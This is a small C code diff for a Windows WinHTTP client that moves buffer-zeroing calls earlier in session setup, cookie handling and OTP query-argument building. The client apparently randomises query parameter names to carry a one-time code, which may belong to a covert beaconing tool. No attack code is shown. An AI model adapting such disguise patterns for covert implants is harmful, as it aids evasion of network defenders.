@@ -270,7 +270,6 @@ PHTTP_SESSION HttpSessionInit
 	Result = ALLOC(sizeof(HTTP_SESSION));
 	SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
 	
-
 	Result->hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	if (!Result->hSession) {
 		LOG_ERROR("WinHttpOpen", GetLastError());
@@ -980,6 +979,7 @@ BOOL HttpStart
 	LPWSTR lpTemp = NULL;
 	LPSTR lpCookiePrefix = NULL;
 
+	SecureZeroMemory(wszSetCookie, sizeof(wszSetCookie));
 	lpFullUri = StartSessionURL(pConfig, pHttpClient);
 	if (lpFullUri == NULL) {
 		goto CLEANUP;
@@ -1013,7 +1013,6 @@ BOOL HttpStart
 	memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
 	pConfig->szSessionID[sizeof(pConfig->szSessionID) - 1] = '\0';
 	dwSetCookieLength = sizeof(wszSetCookie);
-	SecureZeroMemory(wszSetCookie, sizeof(wszSetCookie));
 	if (!WinHttpQueryHeaders(pResp->hRequest, WINHTTP_QUERY_SET_COOKIE, NULL, wszSetCookie, &dwSetCookieLength, WINHTTP_NO_HEADER_INDEX)) {
 		LOG_ERROR("WinHttpQueryHeaders", GetLastError());
 		goto CLEANUP;
@@ -1200,10 +1199,10 @@ LPSTR OtpQueryArgument
 	CHAR Key2;
 	CHAR szOtpCode[9];
 
+	SecureZeroMemory(szOtpCode, sizeof(szOtpCode));
 	lpResult = ALLOC(100);
 	Key1 = szNonceQueryArgChars[GenRandomNumber32(0, lstrlenA(szNonceQueryArgChars))];
 	Key2 = szNonceQueryArgChars[GenRandomNumber32(0, lstrlenA(szNonceQueryArgChars))];
-	SecureZeroMemory(szOtpCode, sizeof(szOtpCode));
 	wsprintfA(lpResult, "%c%c=%08lu", Key1, Key2, (DWORD)uOtpCode);
 	for (i = 0; i < 3; i++) {
 		lpTemp = lpResult;
